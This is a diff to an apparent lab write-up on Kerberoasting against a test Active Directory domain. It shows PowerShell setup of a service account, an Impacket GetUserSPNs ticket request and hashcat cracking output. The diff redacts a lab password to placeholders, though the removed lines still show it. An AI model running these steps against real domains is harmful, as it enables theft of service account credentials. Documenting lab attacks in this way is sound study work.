@@ -13,7 +13,7 @@ The target account had `msDS-SupportedEncryptionTypes` explicitly set to `24` (A
 
 ```powershell
 Set-ADUser svc-sql -Replace @{"msDS-SupportedEncryptionTypes"=24}
-Set-ADAccountPassword svc-sql -NewPassword (ConvertTo-SecureString "ZAQ!2wsx" -AsPlainText -Force)
+Set-ADAccountPassword svc-sql -NewPassword (ConvertTo-SecureString "<password>" -AsPlainText -Force)
 ```
 
 ## 2. Requesting the TGS Ticket
@@ -21,7 +21,7 @@ Set-ADAccountPassword svc-sql -NewPassword (ConvertTo-SecureString "ZAQ!2wsx" -A
 The TGS ticket was requested using Impacket's `GetUserSPNs` from the Kali VM:
 
 ```bash
-impacket-GetUserSPNs 'corp.local/jkowalski:ZAQ!2wsx' -dc-ip 192.168.10.10 -request -request-user svc-sql
+impacket-GetUserSPNs 'corp.local/jkowalski:<password>' -dc-ip 192.168.10.10 -request -request-user svc-sql
 ```
 
 ### Issue: KDC_ERR_ETYPE_NOSUPP
@@ -80,7 +80,7 @@ Hash.Mode........: 19700 (Kerberos 5, etype 18, TGS-REP)
 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
 ```
 
-Recovered plaintext password: `ZAQ!2wsx`
+Recovered plaintext password: `<password>`
 Time to crack: ~15 seconds
 
 ![Hashcat cracked result](../images/04-03-kerberoasting-hashcat-cracked.png)
